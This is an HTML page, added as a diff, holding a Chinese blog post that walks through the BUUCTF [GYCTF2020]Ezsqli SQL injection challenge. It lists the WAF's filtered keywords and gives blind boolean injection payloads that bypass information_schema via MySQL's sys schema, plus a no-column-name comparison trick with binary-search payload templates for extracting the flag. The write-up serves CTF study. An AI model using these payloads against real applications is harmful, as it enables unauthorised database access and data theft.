@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WAF检测题目很直白，直接就POST传参即可，发现是整型注入，稍微试了一下几个关键字，发现有WAF，然后fuzz一下，查看哪些被过滤了有如下 12handler sleep SLEEp delete having or oR BENCHMARK limit LimIt insert insERT INSERT INFORMATION xor AND ANd BY By case admin&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in&#x2F;information">
+<meta property="og:url" content="http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="WAF检测题目很直白，直接就POST传参即可，发现是整型注入，稍微试了一下几个关键字，发现有WAF，然后fuzz一下，查看哪些被过滤了有如下 12handler sleep SLEEp delete having or oR BENCHMARK limit LimIt insert insERT INSERT INFORMATION xor AND ANd BY By case admin&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-23T03:50:48.000Z">
+<meta property="article:modified_time" content="2022-03-23T04:43:21.465Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="sqli web">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/03/23/BUUCTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RoarCTF-2019-Simple-Upload-upload-%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8A%E6%96%87%E4%BB%B6%E5%90%8D%E7%88%86%E7%A0%B4/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&text=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&is_video=false&description=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information&body=Check out this article: http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&name=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&t=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">WAF检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">2.</span> <span class="toc-text">爆数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">爆库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E8%A1%A8"><span class="toc-number">2.2.</span> <span class="toc-text">报表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">2.3.</span> <span class="toc-text">爆字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/" class="leancloud-visitors" data-flag-title="BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-23T03:50:48.000Z" itemprop="datePublished">2022-03-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/sqli-web/" rel="tag">sqli web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="WAF检测"><a href="#WAF检测" class="headerlink" title="WAF检测"></a>WAF检测</h2><p>题目很直白，直接就POST传参即可，发现是整型注入，稍微试了一下几个关键字，发现有WAF，然后fuzz一下，查看哪些被过滤了有如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handler sleep SLEEp delete having or oR BENCHMARK limit LimIt insert insERT INSERT INFORMATION xor AND ANd BY By case admin&#x27; union UNIon UNION oorr anandd HAVING IF INTO JOIN sleep infromation_schema OR ORDER ORD UNION UPDATE USING AND update delete inset DELETE floor rand() information_schema.tables LIMIT ORD order  by ORDER OUTFILE updatexml instr benchmark format bin substring ord UPDATE for BEFORE in SEPARATOR XOR CURSOR FLOOR INFILE </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据库长度</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(lgngth(database()))&lt;&gt;<span class="number">1</span>--</span><br><span class="line">数据库名</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(<span class="built_in">ascii</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))&lt;&gt;<span class="number">1</span>--</span><br></pre></td></tr></table></figure>
+<h3 id="报表"><a href="#报表" class="headerlink" title="报表"></a>报表</h3><p>由于 in 被过滤，所以就要使用mysql5.7的新特性，这里可以先爆数据库版本，但是也可以直接使用新特性，如果不可使用也就是说明不是mysql5.7及以上的版本，即新特性不可用。<br>知识补充：<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/123956.html">过滤in,or字符的sql注入学习 </a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&utm_relevant_index=5">Bypass information_schema与无列名注入</a><br>OK，这样我们就知道如何在没有information_shema下的爆表名<br>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">该库下所有表名长度和</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(select length(group_concat(table_name))<span class="keyword">from</span> sys.schema_table_statistics_with_buffer where table_schema=database())&lt;&gt;<span class="number">1</span>--</span><br><span class="line">该库下表名拼接成的字符串，用 <span class="number">7</span> 分隔</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(select <span class="built_in">ascii</span>(substr(group_concat(table_name,<span class="string">&#x27;7&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="keyword">from</span> sys.schema_table_statistics_with_buffer where table_schema=database())&gt;<span class="number">12</span>--</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>由于in&#x2F;information被禁，所以爆表名无门，启用无列名爆破</p>
+<p>知识补充:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&utm_relevant_index=5">Bypass information_schema与无列名注入</a><br>ok,我们知道如何使用无列名爆破了<br>payload如a下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;((select * <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh))&gt;(select <span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>解释一下这句话<br>就是<code>(select 1,&quot;a&quot;)</code>是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">1</span>,<span class="string">&quot;a&quot;</span>;</span><br><span class="line">+---+---+</span><br><span class="line">| <span class="number">1</span> | a |</span><br><span class="line">+---+---+</span><br><span class="line">| <span class="number">1</span> | a |</span><br><span class="line">+---+---+</span><br></pre></td></tr></table></figure>
+<p><code>(select * from f1ag_1s_h3r3_hhhhh)</code>大概是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+----------------------+</span><br><span class="line">| id | username             |</span><br><span class="line">+----+----------------------+</span><br><span class="line">|  1 | Dumb                 |</span><br><span class="line">+----+----------------------+</span><br></pre></td></tr></table></figure>
+<p>这里已经测试了默认列名id，我们数据只有一行，而且都id&#x3D;1，二者也就能比较第二列的数据了，两边行数不一致进行比较也会报错，除非使用limit限制，但是该题限制了limit，所以也算是出题人的精心构造吧。<br>这时候就可以逐字爆破了，但是太慢了，，，所以用二分法，但是这里有个坑，就是下面这个现象</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;b&#x27;</span>&gt;<span class="string">&#x27;a&#x27;</span>                    true</span><br><span class="line"><span class="string">&#x27;baa&#x27;</span>&gt;<span class="string">&#x27;ba&#x27;</span>                 true</span><br><span class="line"><span class="string">&#x27;bb&#x27;</span>&gt;<span class="string">&#x27;baa&#x27;</span>                 true </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>&lt;<span class="string">&#x27;f&#x27;</span>                 false</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>&gt;<span class="string">&#x27;f&#x27;</span>                 true  这两行导致了二分法的失效</span><br></pre></td></tr></table></figure>
+<p>就是mysql字符串比较的时候是弱类比较，先依次比较对应字符，然后长度。所以必须测试位置字符尾加一个高ascii值，即  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;flag&#x27;</span>&lt;<span class="string">&#x27;f&#x27;</span>                 false</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>&gt;<span class="string">&#x27;f\x7f&#x27;</span>             false  </span><br></pre></td></tr></table></figure>
+<p>贴一下二分法的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大于</span><br><span class="line">payload = <span class="string">&#x27;1&amp;&amp;((select * from f1ag_1s_h3r3_hhhhh))&gt;(select 1,&quot;%s%s\x7f&quot;)&#x27;</span>%(flag,char)</span><br><span class="line"></span><br><span class="line">小于</span><br><span class="line">payload = <span class="string">&#x27;1&amp;&amp;((select * from f1ag_1s_h3r3_hhhhh))&lt;(select 1,&quot;%s%s&quot;)&#x27;</span>%(flag,char)</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在禁了ininformation情况下，使用无列名爆破，同时注意限制列数才能比较。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&utm_relevant_index=5">Bypass information_schema与无列名注入</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/123956.html">过滤in,or字符的sql注入学习</a><br><a target="_blank" rel="noopener" href="https://pythonhowto.readthedocs.io/zh_CN/latest/string.html">特殊字符的转义处理</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">WAF检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">2.</span> <span class="toc-text">爆数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">爆库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E8%A1%A8"><span class="toc-number">2.2.</span> <span class="toc-text">报表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">2.3.</span> <span class="toc-text">爆字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&text=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&is_video=false&description=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information&body=Check out this article: http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&title=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&name=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/&t=BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
